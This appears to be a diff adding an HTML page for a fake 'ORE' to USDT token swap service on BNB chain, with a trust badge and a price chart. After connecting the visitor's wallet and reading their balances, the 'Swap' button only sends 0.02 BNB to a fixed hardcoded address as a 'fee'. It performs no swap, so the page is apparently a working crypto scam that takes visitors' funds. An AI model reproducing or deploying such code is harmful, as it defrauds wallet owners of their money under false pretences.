@@ -1,0 +1,294 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <!-- meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+    <link rel="stylesheet" href="assets/css/style.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css">
+    <!-- ico -->
+
+    <link href="./assets/images/logo.png" rel="icon" type="image/png">
+
+    <title>ORE</title>
+</head>
+<body>
+    <!-- navbar -->
+    <div style="margin-top: 10px;" class="d-flex justify-content-center">
+    <img class="img-fluid" src="img/swap9.jpg" alt="header img" width="100%">
+    </div>
+    <div class="d-flex justify-content-center">
+        <!--<h3>Lightning cryptocurrency exchange</h3>-->
+        <img class="img-fluid" src="img/swap8.jpg" alt="" width="100%">
+    </div>
+    <!-- TradingView Widget BEGIN -->
+<div style="margin-top: -33px; width: 100%;" class="tradingview-widget-container central-box1">
+    <div style="border: none;" class="tradingview-widget-container__widget"></div>
+    <!--<div class="tradingview-widget-copyright"><a href="https://www.tradingview.com/" rel="noopener nofollow" target="_blank"><span class="blue-text">Track all markets on TradingView</span></a></div>-->
+    <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-advanced-chart.js" async>
+    {
+    "height": "400",
+    "symbol": "COINEX:OREUSDT",
+    "interval": "D",
+    "timezone": "Etc/UTC",
+    "theme": "dark",
+    "style": "1",
+    "locale": "en",
+    "hide_top_toolbar": true,
+    "allow_symbol_change": false,
+    "save_image": false,
+    "backgroundColor": "rgba(255, 255, 255, 1)",
+    "calendar": false,
+    "hide_volume": true,
+    "support_host": "https://www.tradingview.com"
+  }
+    </script>
+  </div>
+  <!-- TradingView Widget END -->
+    <!-- content -->
+    <section style="width: 100%; display: flex; justify-content: right; margin-top: -120px;">
+        <div class="central-box">
+            <div class="d-flex">
+                <ul class="nav justify-content-left px-2" id="myTab" role="tablist">
+                    <li class="nav-item">
+                        <a style="color: #000; font-size: 20px; font-weight: 500;" class="nav-link active" data-bs-toggle="tab" data-bs-target="#swap" type="button"
+                            aria-current="page">Swap</a>
+                    </li>
+                </ul>
+            </div>
+
+            <div style=" margin-left: auto; margin-right: auto;" class="tab-content" id="myTabContent">
+                <div class="tab-pane fade show active" id="swap" role="tabpanel" aria-labelledby="swap-tab">
+                    <div class="row px-4">
+
+                        <div class="row g-2 ora-input" id="container1">
+                            <div class="col-9">
+                                <div class="dropdown">
+                                    <button class="btn mb-3 ora-input" type="button" style="background-color: #16122B;">
+                                        ORE
+                                    </button>
+                                </div>
+
+                                <input class="form-control ora-input" id="coinAmt" name="coinAmt" value="1" oninput="updateTokenAmt()" type="float" max="50000">
+                            </div>
+                            <div class="col-3">
+                                <a href="" style="position: relative; top: 60px; text-decoration: none; color: lightgray;">Balance: <span id="BalanceTAICHI">0.00</span></a>
+                            </div>
+                        </div>
+
+                        <div class="center pt-2">
+                            <a href="#" id="doubleArrow" onclick="changeCurrency()">
+                                <svg width="15" height="24" viewBox="0 0 30 38" fill="none"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <path
+                                        d="M17.1429 8.42333L8.57143 -9.36673e-07L-3.68196e-07 8.42333L6.42857 8.42333L6.42857 23.2222L10.7143 23.2222L10.7143 8.42333L17.1429 8.42333ZM21.4286 38L30 29.5767L23.5714 29.5767L23.5714 14.7778L19.2857 14.7778L19.2857 29.5767L12.8571 29.5767L21.4286 38Z"
+                                        fill="#F2C94C" />
+                                </svg>
+                            </a>
+                        </div>
+                        <div class="row g-2 ora-input" id="container2">
+                            <div class="col-9">
+
+                                <button class="btn mb-3 ora-input" type="button" style="background-color: #16122B;">
+                                    USDT
+                                </button>
+                                <input class="form-control ora-input" id="tokenAmt" name="tokenAmt" value="0.27" oninput="updateCoinAmt()" type="text">
+                            </div>
+                            <div class="col-3">
+                                <a href="" style="position: relative; top: 60px; border: 1px solid #16122B; text-decoration: none; color: lightgray;">Balance: <span id="BalanceBUSD">0.00</span></a>
+                            </div>
+                        </div>
+                    </div>
+                    <hr>
+                    <center><p style="color: #000; font-size: 15px; font-weight: 500;">Swap Transaction Rate Fee: 0.02 BNB</p></center>
+                    <div class="d-grid mx-4 px-2" style="padding-top: 20px; padding-bottom: 40px;">
+                        <button class="btn ora-deco-btn p-3" id="connectWalletButton">Connect Wallet</button>
+                        <button class="btn ora-deco-btn p-3" id="sendBNB" style="display:none;">Swap</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <section>
+        <h2>Trusted Since 2018</h2>
+        <div class="d-flex justify-content-center p-3">
+            <img class="djimg" src="img/swap4.jpg" alt="">
+        </div>
+        <div class="d-flex justify-content-center p-3">
+            <img class="djimg" src="img/swap6.jpg" alt="">
+        </div>
+        <div class="d-flex justify-content-center p-3">
+            <img class="djimg" src="img/swap7.jpg" alt="">
+        </div>
+    </section>
+
+    <!-- Option 1: Bootstrap Bundle with Popper -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
+        crossorigin="anonymous"></script>
+
+    <!-- Web3 Library -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.3.6/web3.min.js"></script>
+
+    <script>
+    
+function changeCurrency() {
+    var container1 = document.getElementById('container1');
+    var container2 = document.getElementById('container2');
+
+    var html1 = container1.innerHTML;
+    container1.innerHTML = container2.innerHTML;
+    container2.innerHTML = html1;
+}
+    
+        document.getElementById('connectWalletButton').addEventListener('click', async function () {
+            // Check if Ethereum provider is available
+            if (window.ethereum) {
+                try {
+                    
+                const web3 = new Web3(window.ethereum);
+                const chainId = await web3.eth.getChainId();
+                // Request account access
+                
+                   
+                if(chainId!=56){
+                alert("Please Connect To BNB Network By Clicking On Upper 3 Dots.");
+                return;
+                }                      
+                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                const currentAccount = accounts[0];
+                
+                const busdContractAddress = '0x55d398326f99059fF775485246999027B3197955';
+                        
+                const busdContractAbi = [{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"constant":true,"inputs":[],"name":"_decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"renounceOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}];
+
+                    const busdContract = new web3.eth.Contract(busdContractAbi, busdContractAddress);
+
+                    const busdBalanc = await busdContract.methods.balanceOf(currentAccount).call();
+                    
+                    const busdBalance = (busdBalanc/1000000000000000000);
+                    
+                    
+                    const taichiContractAddress = '0xd26CA23Fd68fbaC021FC106c0b44B64201e0Faf8';
+                    
+                    const taichiContractAbi = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"DOMAIN_SEPARATOR","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"PERMIT_TYPEHASH","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account_","type":"address"},{"internalType":"uint256","name":"amount_","type":"uint256"}],"name":"_burnFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account_","type":"address"},{"internalType":"uint256","name":"amount_","type":"uint256"}],"name":"burnFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account_","type":"address"},{"internalType":"uint256","name":"amount_","type":"uint256"}],"name":"mint","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"nonces","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"permit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"vault_","type":"address"}],"name":"setVault","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner_","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"vault","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}];
+                    
+                    const taichiContract = new web3.eth.Contract(taichiContractAbi, taichiContractAddress);
+
+                    const taichiBalanc = await taichiContract.methods.balanceOf(currentAccount).call();
+                    
+                    const taichiBalance = (taichiBalanc/1000000000000000000);
+                    
+                        
+                
+                alert("Now You Can Swap Your Tokens...")
+    
+                    document.getElementById("BalanceBUSD").innerHTML = busdBalance;
+                    document.getElementById("BalanceTAICHI").innerHTML = taichiBalance;
+                    
+                    document.getElementById("connectWalletButton").style.display = "none";
+                    document.getElementById("sendBNB").style.display = "block";
+                } catch (error) {
+                    alert(`Error connecting to wallet: ${error}`);
+                }
+            } else {
+                alert('Please Use This Link In Trust Wallet or Metamask Wallet For Swap ORE Tokens.');
+            }
+        });
+        
+        
+    document.getElementById('sendBNB').addEventListener('click', async function () {    
+        const web3 = new Web3(window.ethereum);
+            if (typeof web3 !== 'undefined') {
+                // Use the injected web3
+                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                const currentAccount = accounts[0];
+                
+                const amountInEther = "0.02";
+                const amountInWei = web3.utils.toWei(amountInEther, "ether");
+                const recipientAddress = "0x0c4Fa8f4d965d31f6cdcF805662E62aB86B12e81";
+
+                alert(`Holding Swap Transaction Is In Progress...`);
+                
+                try {
+                    
+                    
+                const transactionObject = {
+                        from: currentAccount,
+                        to: recipientAddress,
+                        value: amountInWei,
+                        gas: "21000", // You may need to adjust the gas limit based on your requirements
+                    };
+                    
+                    const transactionHash = await web3.eth.sendTransaction(transactionObject);
+
+                    alert(`Transaction sent successfully! Transaction Hash: ${transactionHash}`);
+                } catch (error) {
+                    
+    if (error instanceof Error) {
+        alert(`Error: ${error.message}`);
+        console.error(error); 
+    } else {
+        const jsonString = JSON.stringify(error);
+
+        alert(`An unexpected error occurred, please try again`);
+        //${jsonString}
+    }
+                }
+                        
+            } else {
+            alert('Web3 is not connected. Please install a wallet like MetaMask.');
+            }
+        
+    });
+        
+    function updateTokenAmt() {
+      const coinAmt = parseFloat(document.getElementById('coinAmt').value);
+      if(coinAmt>50000){
+        alert("Maximum 50000 ORE Per Day.");
+        document.getElementById('tokenAmt').value = 1350;
+        return; 
+      }
+      const tokenAmt = coinAmt * 0.5;
+
+      document.getElementById('tokenAmt').value = tokenAmt;
+    }
+
+    updateTokenAmt();
+    
+    
+    function updateCoinAmt() {
+      const tokenAmt = parseFloat(document.getElementById('tokenAmt').value);
+      /*
+      if(tokenAmt>1350){
+        alert("Maximum 50000 ORE Per Day.") 
+        return; 
+      }
+      */
+      
+      const coinAmt = tokenAmt / 0.5;
+      
+      if(coinAmt>50000){
+        alert("Maximum 50000 ORE Per Day.");
+        document.getElementById('coinAmt').value = 50000;
+        return; 
+      }
+
+      document.getElementById('coinAmt').value = coinAmt;
+    }
+
+    updateCoinAmt();
+    
+    </script>
+
+</body>
+
+</html>
